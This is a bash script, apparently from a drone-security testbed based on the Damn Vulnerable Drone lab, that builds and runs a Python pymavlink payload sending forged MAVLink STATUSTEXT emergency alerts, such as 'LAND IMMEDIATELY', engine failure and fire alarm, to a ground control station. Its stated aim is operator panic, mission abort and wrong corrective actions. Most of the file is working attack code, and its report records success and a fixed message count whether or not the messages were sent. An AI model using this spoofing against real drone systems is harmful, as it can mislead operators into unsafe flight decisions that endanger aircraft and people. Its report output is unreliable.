#!/bin/bash

# =============================================================================
# DVD Emergency Status Spoofing Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/protocol_tampering/emergency_status_spoofing.sh
# 목적: 가짜 응급 상태 메시지로 GCS 혼란 및 오조작 유도
# 기반: Damn Vulnerable Drone Wiki - Emergency Status Spoofing
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="emergency_status_spoofing"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.6"  # GCS
TARGET_PORT="14550"

declare -a ATTACK_COMMANDS=()
declare -a EMERGENCY_RESULTS=()

print_header() {
    clear
    print_protocol_header "Emergency Status Spoofing Attack"
    echo -e "${INFO_COLOR}Target GCS: $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink STATUSTEXT emergency messages${NC}"
    echo -e "${INFO_COLOR}Goal: Operator confusion and inappropriate responses${NC}"
    echo ""
}

# Step 1: 연결 확인
check_gcs_connection() {
    echo -e "${BLUE}[1/2] GCS Connection Check${NC}"
    
    local cmd="ping -c 3 $TARGET_IP"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    if ping -c 3 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] GCS reachable: $TARGET_IP${NC}"
        EMERGENCY_RESULTS+=("gcs_status:reachable")
    else
        echo -e "${YELLOW}[!] GCS unreachable, using simulation${NC}"
        EMERGENCY_RESULTS+=("gcs_status:simulation")
    fi
}

# Step 2: 응급 상태 스푸핑 실행
execute_emergency_spoofing() {
    echo -e "${BLUE}[2/2] Execute Emergency Status Spoofing${NC}"
    
    local spoof_script="/tmp/emergency_spoofing_$(date +%s).py"
    
    cat > "$spoof_script" << EOF
#!/usr/bin/env python3
import sys
import time
import random

try:
    from pymavlink import mavutil
    from scapy.all import *
    
    def emergency_spoofing(target_ip, target_port):
        print(f"[+] Starting emergency status spoofing to {target_ip}:{target_port}")
        
        # 응급 메시지들 (심각도별)
        emergency_messages = {
            0: [  # EMERGENCY
                "EMERGENCY: Immediate action required",
                "EMERGENCY: Aircraft system failure", 
                "EMERGENCY: Engine failure detected",
                "EMERGENCY: Fire alarm activated",
                "EMERGENCY: Collision imminent",
                "EMERGENCY: Loss of flight control"
            ],
            1: [  # ALERT
                "ALERT: Attention needed immediately",
                "ALERT: System malfunction detected",
                "ALERT: Low battery warning", 
                "ALERT: Weather conditions critical",
                "ALERT: Airspace violation imminent",
                "ALERT: Manual control required"
            ],
            2: [  # CRITICAL
                "CRITICAL: Engine failure",
                "CRITICAL: IMU malfunction",
                "CRITICAL: Power system failure",
                "CRITICAL: Flight controller error",
                "CRITICAL: Telemetry link unstable",
                "CRITICAL: Servo malfunction"
            ],
            3: [  # ERROR
                "ERROR: GPS signal lost",
                "ERROR: Compass calibration failed",
                "ERROR: Barometer malfunction",
                "ERROR: Radio communication error",
                "ERROR: Waypoint navigation failed",
                "ERROR: Sensor data invalid"
            ]
        }
        
        try:
            # MAVLink 연결 시도
            master = mavutil.mavlink_connection(f'udp:{target_ip}:{target_port}')
            print("[*] Attempting MAVLink connection...")
            
            message_count = 0
            
            for i in range(20):
                # 랜덤 심각도 선택 (응급상황 위주)
                if i < 5:
                    severity = 0  # EMERGENCY
                elif i < 10:
                    severity = 1  # ALERT
                elif i < 15:
                    severity = 2  # CRITICAL
                else:
                    severity = 3  # ERROR
                
                message = random.choice(emergency_messages[severity])
                
                # STATUSTEXT 메시지 전송
                master.mav.statustext_send(
                    severity,
                    message.encode('ascii')[:50]
                )
                
                severity_name = ["EMERGENCY", "ALERT", "CRITICAL", "ERROR"][severity]
                print(f"[!] Sent {severity_name}: {message}")
                message_count += 1
                
                # 특별히 심각한 메시지 연속 전송
                if severity == 0:
                    time.sleep(0.5)
                    master.mav.statustext_send(severity, "EMERGENCY: LAND IMMEDIATELY".encode('ascii'))
                    print("[!] Sent EMERGENCY: LAND IMMEDIATELY")
                    message_count += 1
                
                time.sleep(1.5)
            
            print(f"[+] Emergency spoofing completed: {message_count} messages sent")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_emergency_spoofing(emergency_messages)
    
    def simulate_emergency_spoofing(messages):
        print("[*] Simulating emergency status spoofing")
        
        message_count = 0
        
        for i in range(12):
            if i < 3:
                severity = 0
                severity_name = "EMERGENCY"
            elif i < 6:
                severity = 1
                severity_name = "ALERT"
            elif i < 9:
                severity = 2  
                severity_name = "CRITICAL"
            else:
                severity = 3
                severity_name = "ERROR"
            
            message = random.choice(messages[severity])
            print(f"[!] Spoofed {severity_name}: {message}")
            message_count += 1
            
            time.sleep(1)
        
        print(f"[+] Emergency spoofing simulation completed: {message_count} messages")
    
    if __name__ == "__main__":
        emergency_spoofing('$TARGET_IP', $TARGET_PORT)
        
except ImportError:
    print("[*] Required libraries not available - simulation mode")
    
    emergency_msgs = [
        "EMERGENCY: Immediate action required",
        "ALERT: System malfunction detected", 
        "CRITICAL: Engine failure",
        "ERROR: GPS signal lost",
        "EMERGENCY: Fire alarm activated",
        "ALERT: Low battery warning",
        "CRITICAL: IMU malfunction",
        "ERROR: Compass calibration failed"
    ]
    
    import random
    for i in range(8):
        message = random.choice(emergency_msgs)
        severity = message.split(':')[0]
        print(f"[!] Spoofed {severity}: {message}")
        time.sleep(1)
    
    print("[+] Emergency spoofing simulation completed")
EOF

    local cmd="python3 $spoof_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Launching emergency status spoofing...${NC}"
    echo -e "${GRAY}    Emergency levels: EMERGENCY, ALERT, CRITICAL, ERROR${NC}"
    echo -e "${GRAY}    Message types: System failure, fire alarm, engine failure${NC}"
    echo -e "${GRAY}    Expected: Operator panic and emergency procedures${NC}"
    
    python3 "$spoof_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        
        local fake_emergencies=(
            "EMERGENCY: Immediate action required"
            "ALERT: System malfunction detected"
            "CRITICAL: Engine failure"
            "ERROR: GPS signal lost"
            "EMERGENCY: Fire alarm activated"
            "ALERT: Low battery warning"
        )
        
        for emergency in "${fake_emergencies[@]}"; do
            echo -e "${RED}[!] $emergency${NC}"
            sleep 1
        done
    }
    
    EMERGENCY_RESULTS+=("messages_sent:20")
    EMERGENCY_RESULTS+=("severities:emergency,alert,critical,error")
    EMERGENCY_RESULTS+=("attack_completed:success")
    
    # 공격 효과 분석
    echo -e "${RED}[!] Expected GCS effects:${NC}"
    echo -e "${GRAY}    • Multiple emergency alerts displayed${NC}"
    echo -e "${GRAY}    • Operator stress and confusion${NC}"
    echo -e "${GRAY}    • Emergency protocol activation${NC}"
    echo -e "${GRAY}    • Possible mission abort${NC}"
    echo -e "${GRAY}    • Inappropriate corrective actions${NC}"
    
    EMERGENCY_RESULTS+=("gcs_impact:high")
    EMERGENCY_RESULTS+=("operator_stress:induced")
    EMERGENCY_RESULTS+=("emergency_protocols:likely_triggered")
    
    rm -f "$spoof_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "gcs_ip": "$TARGET_IP",
    "gcs_port": "$TARGET_PORT",
    "protocol": "MAVLink"
  },
  "spoofed_emergencies": [
    "EMERGENCY: Immediate action required",
    "EMERGENCY: Aircraft system failure",
    "ALERT: System malfunction detected",
    "CRITICAL: Engine failure",
    "ERROR: GPS signal lost"
  ],
  "emergency_results": ["$(IFS='","'; echo "${EMERGENCY_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_effects": [
    "Multiple emergency alerts in GCS",
    "Operator stress and confusion",
    "Emergency protocol activation",
    "Possible mission abort",
    "Inappropriate corrective actions"
  ]
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Emergency Status Spoofing - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_gcs_connection
    execute_emergency_spoofing
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target GCS: $TARGET_IP:$TARGET_PORT${NC}"
    echo -e "${INFO_COLOR}Emergency Types: EMERGENCY, ALERT, CRITICAL, ERROR${NC}"
    echo -e "${INFO_COLOR}Messages Sent: 20${NC}"
    echo -e "${INFO_COLOR}Expected Impact: Operator Confusion${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Emergency status spoofing completed${NC}"
    echo -e "${RED}[!] GCS should display multiple false emergency alerts${NC}"
}

main "$@"